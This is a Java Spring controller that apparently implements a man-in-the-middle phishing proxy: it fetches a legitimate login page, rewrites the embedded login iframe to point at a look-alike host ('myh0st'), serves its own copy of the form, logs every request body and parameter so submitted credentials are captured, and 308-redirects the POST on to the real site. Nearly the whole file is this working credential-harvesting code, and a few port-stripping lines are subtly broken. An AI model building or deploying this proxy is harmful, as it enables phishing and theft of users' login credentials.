package com.oracle.jsc.mitm.mitm;

import java.io.FileInputStream;
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.security.KeyManagementException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManagerFactory;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import jakarta.servlet.http.HttpServletRequest;

@Controller
public class WebController {
    private final Logger logger = LoggerFactory.getLogger(this.getClass());

    /**
     * For an inbound GET, (a) perform the same GET on the legitimate site, (b)
     * change the target address of the embedded login iframe in the legitimate
     * page, then (c) send the legitimate page with the altered form to the
     * requestor.
     * 
     * @param request an innocent request to the wrong URL
     * @return a response that comes "mostly" from the legitimate site, but contains
     *         an iframe with our site's form.
     */
    @RequestMapping(method = RequestMethod.GET, value = "/login")
    public ResponseEntity<String> register(HttpServletRequest request) {
        logInboundRequest(request);

        String requestUrl = request.getRequestURL().toString();
        String targetUrl;
        if (requestUrl.startsWith("https")) {
            targetUrl = requestUrl.toString().replace("myh0st", "myhost");
            targetUrl.replace(":444", ""); // handle the case where both servers are on the same host
        } else {
            targetUrl = requestUrl.toString().replace("myh0st", "myhost");
            targetUrl.replace(":81", ""); // handle the case where both servers are on the same host
        }

        HttpResponse<String> response = null;
        try {
            logger.info("forwarding get to {}", targetUrl);
            response = get(targetUrl, headersToArray(request));

        } catch (HttpsClientConfigurationException | OutboundHttpsException e) {
            logger.error("Unable to call the target web site.", e);
            return ResponseEntity.ok("<html><body>Hi</body></html>");
        }

        if (response.statusCode() != 200) {
            return ResponseEntity.status(response.statusCode()).body(response.body());
        }

        String newBody;
        if (requestUrl.contains("444")) {   // handle the case where both servers are on the same host
            newBody = response.body().replace("src=\"https://myhost/form", "src=\"https://myh0st:444/form");
        } else {
            newBody = response.body().replace("src=\"https://myhost/form", "src=\"https://myh0st/form");
        }

        return ResponseEntity.ok(newBody);
    }

    /**
     * Display the login form.
     * 
     * @param model data carrier for the login form.
     * @return a template name for ThymeLeaf to display.
     */
    @GetMapping("/form")
    public String form(Model model) {
        logger.info("login form requested");
        model.addAttribute("loginDto", new LoginDto());
        return "login_form";
    }

    /**
     * Receives the hijacked POST data, then forwards the browser to the legit
     * website's login method.
     * 
     * @param request the inbound POST from the end user
     * @return a response entity which redirects the POST to the "legitimate" target
     *         using a 308 REDIRECT code.
     */
    @RequestMapping(method = RequestMethod.POST, value = "/login")
    public ResponseEntity<String> login(HttpServletRequest request) {
        logInboundRequest(request);

        String requestUrl = request.getRequestURL().toString();
        String targetUrl = requestUrl
                .replace("myh0st", "myhost")
                .replace(":444", "");

        return ResponseEntity
                .status(308)
                .header("location", targetUrl)
                .build();
    }

    /**
     * Executes an HTTPS GET to the identified endpoint using a custom root cert to
     * validate the endpoint, and resturs the response object.
     * 
     * @param targetUrl where are we headed?
     * @param headers   an array of headers; even indices are names, odd indices are
     *                  values.
     * @return the response to the request
     * @throws HttpsClientConfigurationException if we can't find the root CA
     *                                           keystore, can't unlock it, etc.
     * @throws OutboundHttpsException            if we can't reach the target URL,
     *                                           or it fails to authenticate with
     *                                           the root CA.
     */
    private HttpResponse<String> get(String targetUrl, String[] headers)
            throws HttpsClientConfigurationException, OutboundHttpsException {
        //
        // build an SSL context with the trust store bearing the root cert we are going
        // to allow.
        //
        SSLContext context = null;
        try {
            KeyStore caStore = KeyStore.getInstance("JKS");
            caStore.load(new FileInputStream("catruststore.jks"), "mitm-mitm-password".toCharArray());

            TrustManagerFactory trustManagerFactory = TrustManagerFactory
                    .getInstance(TrustManagerFactory.getDefaultAlgorithm());
            trustManagerFactory.init(caStore);

            context = SSLContext.getInstance("TLSv1.3");
            context.init(null, trustManagerFactory.getTrustManagers(), null);

        } catch (IOException 
                | NoSuchAlgorithmException 
                | CertificateException 
                | KeyStoreException
                | KeyManagementException e) {
            throw new HttpsClientConfigurationException(e);
        }

        //
        // actually make the call with the supplied URL and headers
        //
        HttpClient client = HttpClient.newBuilder().sslContext(context).build();
        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(targetUrl))
                .GET()
                .headers(headers)
                .build();

        HttpResponse<String> response;
        try {
            response = client.send(request, HttpResponse.BodyHandlers.ofString());
        } catch (IOException | InterruptedException e) {
            throw new OutboundHttpsException(e);
        }

        return response;
    }

    // below this line you'll find only string formatting and logging methods
    //

    private void logInboundRequest(HttpServletRequest request) {
        logger.info("request url:     {}\n\t", request.getRequestURL());
        logger.info("request params:  {}\n\t", logParameters(request));
        logger.info("request:headers: {}\n\t", headersToString(request));
        logger.info("request body:    {}", bodyToString(request));
    }

    private String logParameters(HttpServletRequest request) {
        StringBuilder result = new StringBuilder();
        for (Enumeration<String> nameIter = request.getParameterNames(); nameIter.hasMoreElements();) {
            String name = nameIter.nextElement();
            result.append(name).append(": ");
            for (String value : request.getParameterValues(name)) {
                result.append(value).append(", ");
            }
            if (result.toString().endsWith(", ")) {
                result.delete(result.lastIndexOf(", "), result.length());
            }
            if (nameIter.hasMoreElements()) {
                result.append(", ");
            }
        }
        return result.toString();
    }

    private String bodyToString(HttpServletRequest request) {
        StringBuilder result = new StringBuilder();
        try {
            if (request.getInputStream() != null) {
                result.append(new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8));
            } else {
                result.append("(null)");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return result.toString();
    }

    private String[] headersToArray(HttpServletRequest request) {
        List<String> result = new ArrayList<>();
        for (Enumeration<String> nameEnum = request.getHeaderNames(); nameEnum.hasMoreElements();) {
            String name = nameEnum.nextElement();
            // restricted header values excluded
            if (!"host".equals(name) && !"connection".equals(name) && !"upgrade".equals(name)) {
                for (Enumeration<String> valueEnum = request.getHeaders(name); valueEnum.hasMoreElements();) {
                    result.add(name);
                    result.add(valueEnum.nextElement());
                }
            }
        }
        return result.toArray(new String[result.size()]);
    }

    private String headersToString(HttpServletRequest request) {
        StringBuilder result = new StringBuilder("{");
        Enumeration<String> iter = request.getHeaderNames();
        for (String name = iter.nextElement(); iter.hasMoreElements(); name = iter.nextElement()) {
            result.append(name).append(": ").append(request.getHeader(name));
            if (iter.hasMoreElements()) {
                result.append(", ");
            }
        }
        result.append("}");
        return result.toString();
    }

}
